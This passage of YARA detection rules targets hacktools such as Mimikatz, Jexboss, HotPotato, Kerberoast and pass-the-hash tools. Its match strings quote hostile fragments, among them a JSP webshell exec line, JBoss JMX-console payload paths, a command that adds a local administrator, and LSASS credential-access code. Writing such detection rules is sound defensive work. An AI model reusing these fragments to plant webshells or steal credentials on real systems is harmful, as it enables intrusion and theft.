		$s1 = "lsadump_getComputerAndSyskey ; kull_m_registry_RegOpenKeyEx ComputerName KO" fullword wide
		$s2 = "sekurlsa_acquireLSA ; Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_AMD64 (%u)" wide
	condition:
		( uint16(0) == 0x5a4d and filesize < 1000KB and 1 of them ) or all of them
}
rule Mimikatz_Katana_LT_DRV {
	meta:
		description = "Detects Mimikatz version named katana (LT origin)"
		author = "YarGen Rule Generator"
		reference = "https://twitter.com/Cyb3rOps/status/695198395351359490"
		date = "2016-02-04"
		super_rule = 1
		score = 70
		hash1 = "6ef3b8b346bacc273859d6fd228ac41e1eae1d6ee6583463944081f161ee84d5"
		hash2 = "83899d2c7405ec5f4d1f60cd9214631b8a300ba0b20719cc1e9550ee4d7d2abc"
		hash3 = "9fe51617112c0b97763b7f1d4351a4c6dd4a58526573489219268673c8ffdf4c"
	strings:
		$s0 = " ! ZwSetInformationProcess 0x%08x for %u/%-14S" fullword wide
		$s4 = "* Callback [type %u] - Handle 0x%p (@ 0x%p)" fullword wide
		$s5 = "All privileges for the access token from %u/%-14S" fullword wide
		$s6 = "CREATE_NAMED_PIPE" fullword wide
		$s7 = "PreOperation  : " fullword wide
		$s8 = "Dump       " fullword wide
		$s12 = "Token from %u/%-14S" fullword wide
		$s19 = "in (0x%p - %u) ; out (0x%p - %u)" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 85KB and 5 of them
}

/*
	Yara Rule Set
	Author: YarGen Rule Generator
	Date: 2016-02-05
	Identifier:
*/

rule Powerkatz_DLL_Generic {
	meta:
		description = "Detects Powerkatz - a Mimikatz version prepared to run in memory via Powershell (overlap with other Mimikatz versions is possible)"
		author = "Florian Roth"
		reference = "PowerKatz Analysis"
		date = "2016-02-05"
		super_rule = 1
		score = 80
		hash1 = "c20f30326fcebad25446cf2e267c341ac34664efad5c50ff07f0738ae2390eae"
		hash2 = "1e67476281c1ec1cf40e17d7fc28a3ab3250b474ef41cb10a72130990f0be6a0"
		hash3 = "49e7bac7e0db87bf3f0185e9cf51f2539dbc11384fefced465230c4e5bce0872"
	strings:
		$s1 = "%3u - Directory '%s' (*.kirbi)" fullword wide
		$s2 = "%*s  pPublicKey         : " fullword wide
		$s3 = "<3 eo.oe ~ ANSSI E>" fullword wide
		$s4 = "\\*.kirbi" fullword wide

		$c1 = "kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x%08x)" fullword wide
		$c2 = "kuhl_m_lsadump_getComputerAndSyskey ; kuhl_m_lsadump_getSyskey KO" fullword wide
	condition:
		( uint16(0) == 0x5a4d and filesize < 1000KB and 1 of them ) or 2 of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-02-21
	Identifier: TDL (Turla Driver Loader)
*/

rule TDL_Furutaka {
	meta:
		description = "TDL (Turla Driver Loader) - file Furutaka.exe"
		author = "Florian Roth"
		reference = "https://github.com/hfiref0x/TDL"
		date = "2016-02-21"
		hash = "48820631b430a40f296b17280bc18736f8ac428514ffd931b4b529dc5cc04136"
	strings:
		$s1 = "SCM: Vulnerable driver load failure" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 250KB and all of them
}

rule TDL_dummy {
	meta:
		description = "TDL (Turla Driver Loader) - file dummy.sys"
		author = "Florian Roth"
		reference = "https://github.com/hfiref0x/TDL"
		date = "2016-02-21"
		hash = "c371453e2eb9edab0949472d14871f09a6c60e4bab647910da83943bb4d3104c"
	strings:
		$s0 = "Hello from kernel mode, system range start is %p, code mapped at %p" fullword ascii
		$s1 = "I'm at %s, Process : %lu (%p)" fullword ascii
	condition:
		all of them
}

rule TDL_dummy2 {
	meta:
		description = "TDL (Turla Driver Loader) - file dummy2.sys"
		author = "Florian Roth"
		reference = "https://github.com/hfiref0x/TDL"
		date = "2016-02-21"
		hash = "4c8d13b1693c77bc4b75ae0f6262260cbc1478f3da33d039930d265db5d7eb3e"
	strings:
		$s1 = "%s hit with invalid IoControlCode" fullword ascii
		$s2 = "%s DUMMYDRV_REQUEST1 hit" fullword ascii
		$s3 = "DevioctlDispatch" fullword ascii
		$s4 = "%s IoCreateDriver(%wZ) = %lx" fullword ascii
	condition:
		all of them
}


/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-02-21
	Identifier: PowerPath - AD Escalation
*/

rule PowerPath_AD_Escalation {
	meta:
		description = "Detects PowerPath - AD escalation powershell utility"
		author = "Florian Roth"
		reference = "https://github.com/andyrobbins/PowerPath/blob/master/FindShortestPath.ps1"
		date = "2016-02-21"
	strings:
		$s1 = "Get-NetUser | ForEach-Object { $_.samaccountname }" fullword ascii
		$s2 = "Where-Object {$Path[$i] -Contains $_.Name}" fullword ascii
		$s3 = "Where-Object {$_.IsDomain -And !$_.IsGroup} | %{$_.AccountName}" fullword ascii
	condition:
		all of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-02-24
	Identifier: Tater
*/

rule Tater_HackTool_Powershell {
	meta:
		description = "Detects Hacktool Tater - Priv Escalation - file Tater.ps1"
		author = "Florian Roth"
		reference = "https://github.com/Kevin-Robertson/Tater"
		date = "2016-02-24"
		hash = "ac3f3c59da3a7bafc2331e0135942ce99dc8a46b092a16fe81a91326efe694c7"
	strings:
		$x1 = "Start-Process -FilePath \"cmd.exe\" -Argument $process_scheduled_task -WindowStyle Hidden -passthru -Wait" fullword ascii
		$x2 = "[parameter(Mandatory=$false)][ValidateScript({$_ -match [IPAddress]$_ })][string]$SpooferIP=\"127.0.0.1\"," fullword ascii
		$x3 = "if(($process_defender.HasExited -or !$process_defender) -and !$tater.SMB_relay_success -and $hostname_spoof)" fullword ascii
		$x4 = "$tater.console_queue.add(\"$(Get-Date -format 's') - Failed to bind to $UDP_port during cleanup\")" fullword ascii
	condition:
		1 of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-03-09
	Identifier: PSattack
*/

/* Rule Set ----------------------------------------------------------------- */

rule PSAttack_EXE {
	meta:
		description = "PSAttack - Powershell attack tool - file PSAttack.exe"
		author = "Florian Roth"
		reference = "https://github.com/gdssecurity/PSAttack/releases/"
		date = "2016-03-09"
		score = 100
		hash = "ad05d75640c850ee7eeee26422ba4f157be10a4e2d6dc6eaa19497d64cf23715"
	strings:
		$x1 = "\\Release\\PSAttack.pdb" fullword

		$s1 = "set-executionpolicy bypass -Scope process -Force" fullword wide
		$s2 = "PSAttack.Modules." ascii
		$s3 = "PSAttack.PSAttackProcessing" fullword ascii
		$s4 = "PSAttack.Modules.key.txt" fullword wide
	condition:
		( uint16(0) == 0x5a4d and ( $x1 or 2 of ($s*) ) ) or 3 of them
}

rule Powershell_Attack_Scripts {
	meta:
		description = "Powershell Attack Scripts"
		author = "Florian Roth"
		date = "2016-03-09"
		score = 70
	strings:
		$s1 = "PowershellMafia\\Invoke-Shellcode.ps1" ascii
		$s2 = "Nishang\\Do-Exfiltration.ps1" ascii
		$s3 = "PowershellMafia\\Invoke-Mimikatz.ps1" ascii
		$s4 = "Inveigh\\Inveigh.ps1" ascii
	condition:
		1 of them
}

rule PSAttack_ZIP {
	meta:
		description = "PSAttack - Powershell attack tool - file PSAttack.zip"
		author = "Florian Roth"
		reference = "https://github.com/gdssecurity/PSAttack/releases/"
		date = "2016-03-09"
		score = 100
		hash = "3864f0d44f90404be0c571ceb6f95bbea6c527bbfb2ec4a2b4f7d92e982e15a2"
	strings:
		$s0 = "PSAttack.exe" fullword ascii
	condition:
		uint16(0) == 0x4b50 and all of them
}

rule PSSuite_Conjure_LSASS_ps1 {
	meta:
		description = "Detects PowerShell-Suite/Conjure-LSASS.ps1"
		author = "Florian Roth"
		reference = "https://t.co/9SLfnwU4Xx"
		date = "2016-03-09"
		score = 100
	strings:
		$s0 = "$ProcHandle = (Get-Process -Name lsass).Handle" fullword ascii
		$s1 = "$hDuplicateTokenHandle = [IntPtr]::Zero" fullword ascii
	condition:
		all of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-03-30
	Identifier: Jexboss
*/

/* Rule Set ----------------------------------------------------------------- */

rule jexboss_EXE {
	meta:
		description = "Detects Jexboss Jboss Exploit Utility - file jexboss.exe"
		author = "Florian Roth"
		reference = "https://github.com/joaomatosf/jexboss"
		date = "2016-03-30"
		hash = "5b41dd6103dc9da49f8f296b7f917bb23fb657a885db235f796dc3e034c5609c"
	strings:
		$x1 = "sjexboss" fullword ascii
		$s0 = "pyreadline.logger(" fullword ascii
	condition:
		uint16(0) == 0x5a4d and all of them
}

rule jbossass_WAR_Webshell {
	meta:
		description = "Detects Jexboss Jboss Exploit Utility - file jbossass.war / jexboss.jsp"
		author = "Florian Roth"
		reference = "https://github.com/joaomatosf/jexboss"
		date = "2016-03-30"
		hash = "905ba75b5b06cbb2ea75da302c94f6b5605327c59ebdb680c6feabdbc9e242d3"
	strings:
		$war1 = "jbossass.jsp}" fullword ascii
		$war2 = "jbossass.jspPK" fullword ascii

		$jsp1 = "request.getHeader(\"user-agent\").equals(\"jexboss\"))" fullword ascii
		$jsp2 = "{ Process p = Runtime.getRuntime().exec(request.getParameter(\"" ascii
	condition:
		( uint16(0) == 0x4b50 and 1 of ($war*) ) or // .war file
		( uint16(0) == 0x253c and 1 of ($jsp*) )    // .jsp webshell
}

rule jexboss_PY_file {
	meta:
		description = "Detects Jexboss Jboss Exploit Tool - file jexboss.py"
		author = "Florian Roth"
		reference = "https://github.com/joaomatosf/jexboss"
		score = 85
		date = "2016-03-30"
		hash = "006f250540e7ef14554635f22b28b12c5f0682aa828ff5c5460c67281ee7ee3e"
	strings:
		$s1 = "print(RED + \" * Error executing command \\\"%s\\\". \" % cmd.split(\"=\")[1] + ENDC)" fullword ascii
		$s2 = "pool.urlopen('HEAD', url + \"/web-console/Invoker\", redirect=False, headers=headers, body=payload)" fullword ascii
		$s3 = "payload = (\"/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service\"" fullword ascii
		$s4 = "cmd = input(\"Shell> \" + ENDC) if version_info[0] >= 3 else raw_input(\"Shell> \" + ENDC)" fullword ascii
		$s5 = "14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C" ascii // Bitcoin address
	condition:
		1 of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-03-30
	Identifier: TempRacer
*/

/* Rule Set ----------------------------------------------------------------- */

rule TempRacer {
	meta:
		description = "Detects privilege escalation tool - file TempRacer.exe"
		author = "Florian Roth"
		reference = "http://www.darknet.org.uk/2016/03/tempracer-windows-privilege-escalation-tool/"
		date = "2016-03-30"
		hash = "e17d80c4822d16371d75e1440b6ac44af490b71fbee1010a3e8a5eca94d22bb3"
	strings:
		$s1 = "\\obj\\Release\\TempRacer.pdb" ascii
		$s2 = "[+] Injecting into " fullword wide
		$s3 = "net localgroup administrators alex /add" fullword wide
		$s4 = "[+] File: {0} renamed to {1}" fullword wide
		$s5 = "[+] Blocking " fullword wide
	condition:
		( uint16(0) == 0x5a4d and filesize < 25KB and 1 of them ) or ( 4 of them )
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-04-01
	Identifier: Linux Hacktool Shark
*/

/* Super Rules ------------------------------------------------------------- */

rule Linux_Portscan_Shark_1 {
	meta:
		description = "Detects Linux Port Scanner Shark"
		author = "Florian Roth"
		reference = "Virustotal Research - see https://github.com/Neo23x0/Loki/issues/35"
		date = "2016-04-01"
		super_rule = 1
		hash1 = "4da0e535c36c0c52eaa66a5df6e070c52e7ddba13816efc3da5691ea2ec06c18"
		hash2 = "e395ca5f932419a4e6c598cae46f17b56eb7541929cdfb67ef347d9ec814dea3"
	strings:
		$s0 = "rm -rf scan.log session.txt" fullword ascii
		$s17 = "*** buffer overflow detected ***: %s terminated" fullword ascii
		$s18 = "*** stack smashing detected ***: %s terminated" fullword ascii
	condition:
		( uint16(0) == 0x7362 and all of them )
}

rule Linux_Portscan_Shark_2 {
	meta:
		description = "Detects Linux Port Scanner Shark"
		author = "Florian Roth"
		reference = "Virustotal Research - see https://github.com/Neo23x0/Loki/issues/35"
		date = "2016-04-01"
		super_rule = 1
		hash1 = "5f80bd2db608a47e26290f3385eeb5bfc939d63ba643f06c4156704614def986"
		hash2 = "90af44cbb1c8a637feda1889d301d82fff7a93b0c1a09534909458a64d8d8558"
	strings:
		$s1 = "usage: %s <fisier ipuri> <fisier useri:parole> <connect timeout> <fail2ban wait> <threads> <outfile> <port>" fullword ascii
		$s2 = "Difference between server modulus and host modulus is only %d. It's illegal and may not work" fullword ascii
		$s3 = "rm -rf scan.log" fullword ascii
	condition:
		all of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-04-06
	Identifier: Hyena
*/

rule Hyena_Sys_Net_Discovery {
	meta:
		description = "Detects Hyena - a tool sometimes used by attacker groups to gather intel - file HYENA.exe"
		author = "Florian Roth"
		reference = "https://www.secureworks.com/blog/ransomware-deployed-by-adversary"
		date = "2016-04-06"
		score = 55
		hash = "2dafe5ed678e44fcf34c7d18c969e971d12a56ccfef161886f35a4ee221a9c5c"
	strings:
		$s1 = "aSystemTools_PSI.dll cannot be found at '%s'.  Reinstall Hyena or contact support@systemtools.com." fullword wide
		$s2 = "\"%s\\strcm.exe\" /rcm=%s /host=%s /cmd=view" fullword wide
	condition:
		( uint16(0) == 0x5a4d and 1 of them )
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-05-12
	Identifier: ONHAT
*/

rule ONHAT_Proxy_Hacktool {
	meta:
		description = "Detects ONHAT Proxy - Htran like SOCKS hack tool used by Chinese APT groups"
		author = "Florian Roth"
		reference = "https://goo.gl/p32Ozf"
		date = "2016-05-12"
		score = 100
		hash1 = "30b2de0a802a65b4db3a14593126301e6949c1249e68056158b2cc74798bac97"
		hash2 = "94bda24559713c7b8be91368c5016fc7679121fea5d565d3d11b2bb5d5529340"
		hash3 = "a26e75fec3b9f7d5a1c3d0ce1e89e4b0befb7a601da0c69a4cf96301921771dd"
		hash4 = "c202e9d5b99f6137c7c07305c7314e55f52bae832d460c44efc8f2a90ff03615"
		hash5 = "dded62ad85c0bdd68bcc96f88d8ba42d5ad0ef999911ebdea3f561a4491ebbc6"
		hash6 = "f0954774c91603fc2595f0ba0727b9af4e80f6f9be7bb629e7fb6ba4309ed4ea"
		hash7 = "f3906be01d51e2e1ae9b03cd09702b6e0794b9c9fd7dc04024f897e96bb13232"
		hash8 = "f65ae9ccf988a06a152f27a4c0d7992100a2d9d23d80efe8d8c2a5c9bd78a3a7"
	strings:
		$s1 = "INVALID PARAMETERS. TYPE ONHAT.EXE -h FOR HELP INFORMATION." fullword ascii
		$s2 = "[ONHAT] LISTENS (S, %d.%d.%d.%d, %d) ERROR." fullword ascii
		$s3 = "[ONHAT] CONNECTS (T, %d.%d.%d.%d, %d.%d.%d.%d, %d) ERROR." fullword ascii
	condition:
		( uint16(0) == 0x5a4d and filesize < 80KB and ( 1 of ($s*) ) ) or ( 2 of them )
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-05-12
	Identifier: BeepService
*/

rule BeepService_Hacktool {
	meta:
		description = "Detects BeepService Hacktool used by Chinese APT groups"
		author = "Florian Roth"
		reference = "https://goo.gl/p32Ozf"
		date = "2016-05-12"
		score = 85
		hash1 = "032df812a68852b6f3822b9eac4435e531ca85bdaf3ee99c669134bd16e72820"
		hash2 = "e30933fcfc9c2a7443ee2f23a3df837ca97ea5653da78f782e2884e5a7b734f7"
		hash3 = "ebb9c4f7058e19b006450b8162910598be90428998df149977669e61a0b7b9ed"
		hash4 = "6db2ffe7ec365058f9d3b48dcca509507c138f19ade1adb5f13cf43ea0623813"
	strings:
		$x1 = "\\\\%s\\admin$\\system32\\%s" fullword ascii

		$s1 = "123.exe" fullword ascii
		$s2 = "regclean.exe" fullword ascii
		$s3 = "192.168.88.69" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and $x1 and 1 of ($s*)
}

/*
	Yara Rule Set
	Author: YarGen Rule Generator
	Date: 2016-05-21
	Identifier: No PowerShell
*/

rule No_PowerShell {
	meta:
		description = "Detects an C# executable used to circumvent PowerShell detection - file nps.exe"
		author = "Florian Roth"
		reference = "https://github.com/Ben0xA/nps"
		date = "2016-05-21"
		score = 80
		hash1 = "64f811b99eb4ae038c88c67ee0dc9b150445e68a2eb35ff1a0296533ae2edd71"
	strings:
		$s1 = "nps.exe -encodedcommand {base64_encoded_command}" fullword wide
		$s2 = "c:\\Development\\ghps\\nps\\nps\\obj\\x86\\Release\\nps.pdb" fullword ascii
	condition:
		( uint16(0) == 0x5a4d and filesize < 40KB and ( 1 of ($s*) ) ) or ( all of them )
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-05-21
	Identifier: Kerberoast
*/

rule GetUserSPNs_VBS {
	meta:
		description = "Auto-generated rule - file GetUserSPNs.vbs"
		author = "Florian Roth"
		score = 80
		reference = "https://github.com/skelsec/PyKerberoast"
		date = "2016-05-21"
		hash1 = "8dcb568d475fd8a0557e70ca88a262b7c06d0f42835c855b52e059c0f5ce9237"
	strings:
		$s1 = "Wscript.Echo \"User Logon: \" & oRecordset.Fields(\"samAccountName\")" fullword ascii
		$s2 = "Wscript.Echo \" USAGE:        \" & WScript.ScriptName & \" SpnToFind [GC Servername or Forestname]\"" fullword ascii
		$s3 = "strADOQuery = \"<\" + strGCPath + \">;(&(!objectClass=computer)(servicePrincipalName=*));\" & _" fullword ascii
	condition:
		2 of them
}

rule GetUserSPNs_PS1 {
	meta:
		description = "Auto-generated rule - file GetUserSPNs.ps1"
		author = "Florian Roth"
		score = 80
		reference = "https://github.com/skelsec/PyKerberoast"
		date = "2016-05-21"
		hash1 = "1b69206b8d93ac86fe364178011723f4b1544fff7eb1ea544ab8912c436ddc04"
	strings:
		$s1 = "$ForestInfo = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()" fullword ascii
		$s2 = "@{Name=\"PasswordLastSet\";      Expression={[datetime]::fromFileTime($result.Properties[\"pwdlastset\"][0])} } #, `" fullword ascii
		$s3 = "Write-Host \"No Global Catalogs Found!\"" fullword ascii
		$s4 = "$searcher.PropertiesToLoad.Add(\"pwdlastset\") | Out-Null" fullword ascii
	condition:
		2 of them
}

rule kerberoast_PY {
	meta:
		description = "Auto-generated rule - file kerberoast.py"
		author = "Florian Roth"
		score = 80
		reference = "https://github.com/skelsec/PyKerberoast"
		date = "2016-05-21"
		hash1 = "73155949b4344db2ae511ec8cab85da1ccbf2dfec3607fb9acdc281357cdf380"
	strings:
		$s1 = "newencserverticket = kerberos.encrypt(key, 2, encoder.encode(decserverticket), nonce)" fullword ascii
		$s2 = "key = kerberos.ntlmhash(args.password)" fullword ascii
		$s3 = "help='the password used to decrypt/encrypt the ticket')" fullword ascii
      $s4 = "newencserverticket = kerberos.encrypt(key, 2, e, nonce)" fullword ascii
	condition:
		2 of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-06-02
	Identifier: Win Privilege Escalation
*/

rule Win_PrivEsc_gp3finder_v4_0 {
	meta:
		description = "Detects a tool that can be used for privilege escalation - file gp3finder_v4.0.exe"
		author = "Florian Roth"
		reference = "http://grimhacker.com/2015/04/10/gp3finder-group-policy-preference-password-finder/"
		date = "2016-06-02"
		score = 80
		hash1 = "7d34e214ef2ca33516875fb91a72d5798f89b9ea8964d3990f99863c79530c06"
	strings:
		$x1 = "Check for and attempt to decrypt passwords on share" ascii
		$x2 = "Failed to auto get and decrypt passwords. {0}s/" fullword ascii
		$x3 = "GPPPFinder - Group Policy Preference Password Finder" fullword ascii
	condition:
		( uint16(0) == 0x5a4d and 1 of ($x*) ) or ( all of them )
}

rule Win_PrivEsc_folderperm {
	meta:
		description = "Detects a tool that can be used for privilege escalation - file folderperm.ps1"
		author = "Florian Roth"
		reference = "http://www.greyhathacker.net/?p=738"
		date = "2016-06-02"
		score = 80
		hash1 = "1aa87df34826b1081c40bb4b702750587b32d717ea6df3c29715eb7fc04db755"
	strings:
		$x1 = "# powershell.exe -executionpolicy bypass -file folderperm.ps1" fullword ascii
		$x2 = "Write-Host \"[i] Dummy test file used to test access was not outputted:\" $filetocopy" fullword ascii
		$x3 = "Write-Host -foregroundColor Red \"      Access denied :\" $myarray[$i] " fullword ascii
	condition:
		1 of them
}

rule Win_PrivEsc_ADACLScan4_3 {
	meta:
		description = "Detects a tool that can be used for privilege escalation - file ADACLScan4.3.ps1"
		author = "Florian Roth"
		reference = "https://adaclscan.codeplex.com/"
		score = 60
		date = "2016-06-02"
		hash1 = "3473ddb452de7640fab03cad3e8aaf6a527bdd6a7a311909cfef9de0b4b78333"
	strings:
		$s1 = "<Label x:Name=\"lblPort\" Content=\"Port:\"  HorizontalAlignment=\"Left\" Height=\"28\" Margin=\"10,0,0,0\" Width=\"35\"/>" fullword ascii
		$s2 = "(([System.IconExtractor]::Extract(\"mmcndmgr.dll\", 126, $true)).ToBitMap()).Save($env:temp + \"\\Other.png\")    " fullword ascii
		$s3 = "$bolValid = $ctx.ValidateCredentials($psCred.UserName,$psCred.GetNetworkCredential().Password)" fullword ascii
	condition:
		all of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-06-02
	Identifier: Windows Enumeration
*/

rule nettynum {
	meta:
		description = "Detects Windows enumeration tool - file nettynum.exe"
		author = "Florian Roth"
		reference = "http://grimhacker.com/2014/05/28/nettynum-a-windows-domain-enumeration-tool/"
		date = "2016-06-02"
		hash1 = "d6866387c79ed1620dd6d416000e190df008cdd9f6d036ed9accdebdb3a8fec7"
	strings:
		$s1 = "nettynum.exe" ascii
		$s2 = "pythoncom" ascii
	condition:
		( uint16(0) == 0x5a4d and all of them )
}

rule Win_Enum_Reaper {
	meta:
		description = "Detects Windows enumeration tool - file Reaper.exe"
		author = "Florian Roth"
		reference = "https://blog.netspi.com/introducing-reaper-the-windows-network-enumeration-utility/"
		date = "2016-06-02"
		hash1 = "8169f8c9704e5effabc2af6748792650e523efcaf1404853a22f0910437bd71e"
	strings:
		$s1 = "Full NetBIOS credentials unspecified, skipping NetBIOS login." fullword wide
		$s2 = "No target IP specified, skipping NetBIOS user enumeration." fullword wide
	condition:
		( uint16(0) == 0x5a4d and 1 of them )
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-06-03
	Identifier: HotPotate Exploit
*/

rule HotPotato_Potato {
	meta:
		description = "Detects HotPotato Exploit Tools - file Potato.exe"
		author = "Florian Roth"
		reference = "https://foxglovesecurity.com/2016/01/16/hot-potato/"
		score = 90
		date = "2016-06-03"
		hash1 = "7e21c5b9cf9cb3cc0b3c6909fdf3a7820c6feaa45e86722ed4e7a43d39aee819"
	strings:
		$s1 = "/C schtasks.exe /Create /TN omg /TR  \\\\127.0.0.1@" fullword wide
		$s2 = "\\Release\\Potato.pdb" ascii
		$s3 = "function FindProxyForURL(url,host){if (dnsDomainIs(host, \"localhost\")) return \"DIRECT\";" fullword wide
		$s4 = "http://127.0.0.1/wpad.dat" fullword wide
		$s5 = "Spoofed target " fullword wide
		$s6 = "DNS lookup succeeds - UDP Exhaustion failed!" fullword wide
		$s7 = "Potato.exe" fullword wide
		$s8 = "return \"PROXY 127.0.0.1:80\";}" fullword wide
		$s9 = "http://localhost/test" fullword wide
	condition:
		( uint16(0) == 0x5a4d and filesize < 60KB and 2 of ($s*) ) or ( 4 of them )
}

rule HotPotato_Potato_Output {
	meta:
		description = "Detects HotPotato Exploit output files"
		author = "Florian Roth"
		reference = "https://foxglovesecurity.com/2016/01/16/hot-potato/"
		score = 90
		date = "2016-09-14"
	strings:
		$s1 = "Parsing initial NTLM auth..." fullword ascii
		$s2 = "Redirecting to target" ascii
		$s3 = "Clearing dns and nbns cache..." fullword ascii
		$s4 = "Setting up SMB relay..." ascii
	condition:
		2 of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-06-03
	Identifier: PTH Toolkit
*/

rule pth_toolkit_bin_wmis {
	meta:
		description = "Pass-the-Hash Linux toolkit component - file wmis"
		author = "Florian Roth"
		reference = "https://github.com/byt3bl33d3r/pth-toolkit/tree/master/bin"
		date = "2016-06-03"
		score = 50
		hash1 = "2e70b4bcc21c4aba64c283af815b20d52c79c93f14f9df623a6e588491155acf"
	strings:
		$s1 = "password_hash_handle: generation of new kerberos keys failed: %s is a computer without a samAccountName" fullword ascii
		$s2 = "password_hash_handle: generation of new kerberos keys failed: %s has no samAccountName" fullword ascii
		$s3 = "Failed to commit transaction to change password on %s: %s" fullword ascii
	condition:
		( uint16(0) == 0x457f and ( 1 of ($s*) ) ) or ( 1 of them )
}

rule pth_toolkit_bin_net {
	meta:
		description = "Pass-the-Hash Linux toolkit component - file net"
		author = "Florian Roth"
		reference = "https://github.com/byt3bl33d3r/pth-toolkit/tree/master/bin"
		date = "2016-06-03"
		score = 50
		hash1 = "9d3ebfe38c45da2bedc4250b4a5b8dcfe4a6c3505ccfe9a429f39b06a8ecc228"
	strings:
		$x1 = "net [<method>] user ADD <name> [password] [-c container] [-F user flags] [misc. options] [targets]" fullword ascii
		$x2 = "Attempting to update system keytab with new password." fullword ascii
		$x3 = "keytab - put account passwords in krb5 keytab (defaults to system keytab)" fullword ascii
		$x4 = "Dump remote SAM database to Kerberos Keytab" fullword ascii
	condition:
		( uint16(0) == 0x457f and filesize < 6000KB and ( 1 of ($x*) ) ) or ( 3 of them )
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-06-03
	Identifier: Foundstone FScan
*/

rule Foundstone_Fscan {
	meta:
		description = "Foundstone FScan"
		author = "Florian Roth"
		reference = "not set"
		date = "2016-06-03"
		score = 70
		hash1 = "bedfcc99e86ce38658f5b988760686264ae03076679cc8d5418e8f1481ee08d4"
	strings:
		$s1 = "FScan v1.12 - Command line port scanner." fullword ascii
		$s2 = "Example: fscan -bp 80,100-200,443 10.0.0.1-10.0.1.200" fullword ascii
		$s3 = "and grab the banners from those ports on those hosts." fullword ascii
		$s4 = "-b    - get port banners" fullword ascii
		$s5 = "on all IP addresses between 10.0.0.1 and 10.0.1.200 inclusive" fullword ascii
		$s6 = "-n    - no port scanning - only pinging (unless you use -q)" fullword ascii
		$s7 = "-l    - port list file - enclose name in quotes if it contains spaces" fullword ascii
	condition:
		( uint16(0) == 0x5a4d and filesize < 50KB and 1 of ($s*) ) or ( 4 of them )
}

rule Foundstone_Fscan_Output {
	meta:
		description = "Foundstone FScan Output"
		author = "Florian Roth"
		reference = "not set"
		date = "2016-06-03"
		score = 70
	strings:
		$s1 = "Scan started at " fullword ascii
		$s2 = "Scan finished at" fullword ascii
		$s3 = "ports in" fullword ascii
		$s4 = "Time taken:" fullword ascii
		$s5 = "ports/sec)" fullword ascii
	condition:
		all of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-06-10
	Identifier: SharpCat
*/

rule SharpCat {
	meta:
		description = "Detects Hack Tool SharpCat - file SharpCat.exe"
		author = "Florian Roth"
		reference = "https://github.com/Cn33liz/SharpCat"
		date = "2016-06-10"
		score = 80
		hash1 = "96dcdf68b06c3609f486f9d560661f4fec9fe329e78bd300ad3e2a9f07e332e9"
	strings:
		$x1 = "ShellZz" fullword ascii
		$s2 = "C:\\Windows\\System32\\cmd.exe" fullword wide
		$s3 = "currentDirectory" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 20KB and all of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-06-10
	Identifier: Hacktools
*/

rule ipscan24_Scan {
	meta:
		description = "IP / Port Scanner - file ipscan24.exe"
		author = "Florian Roth"
		reference = "Internal Research"
		date = "2016-06-27"
		score = 70
		hash1 = "2c08192b33c9a3e080e044c4e6ea026a3ba030c72844085d32ce4a9bfc9d33ef"
	strings:
		$x1 = "NameTableTypeColumnValue_ValidationNPropertyId_SummaryInformationDescriptionSetCategoryKeyColumnMaxValueNullableKeyTableMinValue" ascii
		$x2 = "This installer contains the logic and data to install Advanced IP Scanner" fullword ascii
		$x3 = "advanced_ip_scanner_console.exe" fullword ascii
		$x4 = "advanced_ip_scanner.exe" fullword ascii
	condition:
		( uint16(0) == 0x5a4d and 2 of ($x*) ) or ( all of them )
}

rule vnc_auth_bypass {
	meta:
		description = "VNC Brute Force Tool"
		author = "Florian Roth"
		reference = "Internal Research"
		date = "2016-06-27"
		score = 80
		hash1 = "28d0e945f0648bed7b7b2a2139f2b9bf1901feec39ff4f6c0315fa58e054f44e"
	strings:
		$x1 = "[+] Usage: VNC_bypauth <target> <scantype> <option>" fullword ascii
		$x2 = "VNC_bypauth -i 192.168.0.1" fullword ascii
		$x3 = "[+] To increase the speed under linux, try ulimit -s unlimited" fullword ascii
		$x4 = "| TARGET: ip |" fullword ascii
	condition:
		( uint16(0) == 0x5a4d and filesize < 100KB and 1 of ($x*) ) or ( all of them )
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-07-19
	Identifier:
*/

/* Rule Set ----------------------------------------------------------------- */

rule Invoke_mimikittenz {
	meta:
		description = "Auto-generated rule - file Invoke-mimikittenz.ps1"
		author = "Florian Roth"
		reference = "https://github.com/putterpanda/mimikittenz"
		date = "2016-07-19"
		hash1 = "14e2f70470396a18c27debb419a4f4063c2ad5b6976f429d47f55e31066a5e6a"
	strings:
		$x1 = "[mimikittenz.MemProcInspector]" ascii

		$s1 = "PROCESS_ALL_ACCESS = PROCESS_TERMINATE | PROCESS_CREATE_THREAD | PROCESS_SET_SESSIONID | PROCESS_VM_OPERATION |" fullword ascii
		$s2 = "IntPtr processHandle = MInterop.OpenProcess(MInterop.PROCESS_WM_READ | MInterop.PROCESS_QUERY_INFORMATION, false, process.Id);" fullword ascii
